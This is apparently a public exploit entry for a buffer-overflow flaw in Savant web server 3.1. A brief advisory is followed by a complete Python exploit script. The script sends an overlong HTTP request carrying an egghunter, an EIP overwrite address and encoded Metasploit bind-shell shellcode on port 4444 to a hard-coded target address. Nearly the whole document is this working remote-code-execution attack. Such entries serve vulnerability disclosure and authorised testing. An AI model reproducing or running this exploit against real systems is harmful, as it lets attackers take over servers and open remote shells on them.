source: http://www.securityfocus.com/bid/51607/info

Savant web server is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Savant web server 3.1 is vulnerable; other versions may also be affected.

#!/usr/bin/python
import socket
 
target_address="10.10.10.129"
target_port=80
 
buffer2 = "R0cX" + "R0cX"
# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 4 -t c
buffer2 += ("\xbd\xec\x37\x93\x4b\xdb\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x6a\x83\xc0\x04\x31\x68\x10\x03\x68\x10\x0e\xc2\x4a\xa1\x17"
"\x59\x49\xc2\xff\x91\x58\x90\x5d\x29\xec\xb0\x10\xb1\x92\xd3"
"\xae\x07\xc5\x35\x4d\x38\xf3\xdb\x06\xfc\xec\x5f\xa5\x66\x93"
"\xcc\x5d\x07\x81\xcb\xcc\x59\x35\x45\xd6\x2d\x15\xa1\xe7\xbb"
"\xd6\x5d\x68\x57\x1b\x2a\x4f\xe8\xdd\xd3\xc0\x84\x0c\x0e\xb7"
"\x03\x24\xc7\xfd\xd2\xa5\x88\x89\xf8\x07\x82\x1b\xcb\x2d\x3b"
"\xfd\x9d\x67\xa9\xff\xe9\x20\x9e\xa9\x25\x8b\x7c\xda\xd9\x01"
"\x32\x51\x36\x9a\xe7\x73\x8f\xe5\xea\x60\xa6\x4c\x78\xef\xbb"
"\x1e\x37\xd0\xbd\xaa\x4f\xe7\x94\x3e\x02\x34\x21\xc6\xc1\xe2"
"\xa3\x6f\x76\x92\x9a\xed\xda\x19\x2d\xca\x21\xb2\xb0\xa9\xb5"
"\x72\xa1\xbb\xd0\x18\x64\xd3\xb4\x85\x0c\x92\xf7\x07\xcf\x13"
"\xc2\x95\x57\x0a\x68\x6d\x94\x6f\x5a\xad\xd1\x82\x26\x9f\x3c"
"\x0d\x2b\xdc\x06\x6a\xd3\x87\x24\x9c\x14\x58\x71\x42\xef\x1b"
"\x90\xdc\x46\x67\x51\xd3\x4c\xc4\x11\x23\x29\xbd\xc5\xab\x96"
"\x54\x5e\xb6\x08\x60\x42\x5f\x7a\x76\xdf\x30\x05\x76\xb7\xd1"
"\xf2\x49\xba\x14\x69\xa7\x7b\xa8\x6b\xb9\xad\xc8\x8e\x0f\x9e"
"\x07\x7f\xa7\x89\x9b\x4d\x68\xbd\x45\x77\xe0\x64\xec\xa2\x18"
"\x2d\x6f\x10\xc3\x14\x1d\x4e\x92\x3a\x8a\xf0\xd8\x07\x12\x19"
"\x27\x0c\x23\xe4\x0b\xbb\x6d\x97\xf8\xe8\x8c\x23\xb5\xe0\x22"
"\xe8\x70\x85\x10\xbb\x64\xbe\x09\x41\xe7\x2d\x6d\x39\xfb\xcc"
"\x09\xee\xca\x8f\x83\x22\x5d\x77\x2b\x5b\xc6\x1b\x82\x6e\x17"
"\x03\xe8\x6c\x35\x55\x71\xd4\x35\x72\x12\x3f\x11\x6e\xcf\x09"
"\x5a\xd0\x33\x40\x8e\x3f\x36\xbf\xd7\xd0\x85\x17\x03\xd3\xc4"
"\x7f\x17\x6e\xe8\x0d\xa6\x5f\x9e\xd6\x1b\xf4\x2b\x8c\xb3\xad"
"\x19\xb3\x70\xac\x56\x76\x0c\xfb\x4f\xc4\x99\xdd\x99\x75\x8f"
"\xa8\xfa\x91\x5c\xfb\x26\xbd\x8a\xea\xec\x0d\xf1\x45\x4f\x72"
"\xd1\x02\x47\x9c\xa5\x33\x1e\xf8\xc7\x00\xd2\x3d\x86\xb4\x7c"
"\xb9\x85\x5f\x8c\x40\x58\x7e\x7c\x5d\x76\x3a\xd6\x0b\x9e\xfe"
"\x88\xc7\x60\x56\x99\x19\x7f\x7a\xda\x93\x72\x99\x3f\x69")
 
badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14
 
sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2
 
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()